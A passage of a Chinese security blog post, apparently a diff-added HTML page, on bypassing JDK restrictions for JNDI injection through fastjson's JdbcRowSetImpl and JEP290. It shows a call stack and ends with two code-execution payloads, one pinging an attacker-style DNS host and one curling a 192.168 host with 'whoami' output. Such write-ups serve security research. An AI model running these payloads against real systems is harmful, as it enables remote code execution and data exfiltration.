UnicastRef (sun.rmi.server)</span><br><span class="line">invoke:174, UnicastRef (sun.rmi.server)</span><br><span class="line">getReference:-1, ReferenceWrapper_Stub (com.sun.jndi.rmi.registry)</span><br><span class="line">decodeObject:476, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:91, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:722, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:568, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:877, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:183, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:9, FastTest1 (fastjson)</span><br></pre></td></tr></table></figure>
+
+<p>其实主要是在这个方法进入的，不像普通的bind,rebind操作（在远程引用层中客户端服务端两个交互的类分别是<code>RegistryImpl_Stub</code>和<code>RegistryImpl_Skel</code>，在服务端的<code>RegistryImpl_Skel</code>类中，向注册中心进行bind、rebind操作时均进行了readObject操作以此拿到Remote远程对象引用）这个是在准备decodeObject的时候，对远程对象进行一个获取的操作，才有了接下来的<code>java.io.ObjectInputStream#readObject</code>jep290的绕过：</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210901112329971.png" alt="image-20210901112329971"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialFilter &#x3D; ObjectInputFilter.Config.getSerialFilter();</span><br></pre></td></tr></table></figure>
+
+<p>這個其實就是大名鼎鼎的 <a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a> 防禦機制</p>
+<p>想绕过：</p>
+<p>加载目标类：</p>
+<p>Class.forName Classloader.loadClass</p>
+<p>与ClassLoader.loadClass() 一个小小的区别是，forName() 默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了 JVM 虚拟机中。</p>
+<p>我们执行如下测试代码：</p>
+<p>先了解Java 中创建对象的方法大概有下面这七种：</p>
+<ul>
+<li>使用 new 关键字</li>
+<li>Class 类的 newInstance() 方法</li>
+<li>Constructor 类的 newInstance() 方法</li>
+<li>Object 对象的 clone 方法</li>
+<li>反序列化创建对象</li>
+<li>使用 Unsafe 类创建对象</li>
+<li>通过工厂方法返回对象，如：String str = String.valueOf(23); </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;&quot;[&quot;class&quot;].forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;var x&#x3D;new java.lang.ProcessBuilder;x.command([&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,&#39;ping &quot;+ &quot;2&quot;+ ss +&quot;.sec.v1rus.top&#39;]);x.start()&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&quot;1&quot;.getClass ().getClass ().getMethods()[0].invoke(&quot;&quot;.getClass (), &quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;curl http:&#x2F;&#x2F;192.168.*.*&#x2F;&#96;whoami&#96;&#39;]).start()&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/07/19/java/java%E9%80%86%E5%90%91/1/" rel="next" title="java/java逆向/1">
+                <i class="fa fa-chevron-left"></i> java/java逆向/1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/" rel="prev" title="Oracle注入技巧/1">
+                Oracle注入技巧/1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/user.jpg"
+                alt="Virusday" />
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">75</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/" title="十月整理的问题/1" target="_blank">十月整理的问题/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/" title="杂问题/1" target="_blank">杂问题/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/" title="Oracle注入技巧/1" target="_blank">Oracle注入技巧/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/" title="java/绕过高版本的ldap+rmi/1" target="_blank">java/绕过高版本的ldap+rmi/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/07/19/java/java%E9%80%86%E5%90%91/1/" title="java/java逆向/1" target="_blank">java/java逆向/1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过高版本jdk限制进行jndi注入利用"><span class="nav-number">1.</span> <span class="nav-text">绕过高版本jdk限制进行jndi注入利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK-6u141-JDK-7u131-JDK-8u121-之前"><span class="nav-number">1.1.</span> <span class="nav-text">JDK 6u141, JDK 7u131, JDK 8u121 之前</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-关于JNDI-Naming-Reference的限制"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 关于JNDI Naming Reference的限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-关于codebase"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 关于codebase</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-特地去找了一下jdbc-jep290的绕过"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 特地去找了一下jdbc jep290的绕过</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">103.8k</span>
+  
+</div>
+-->
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
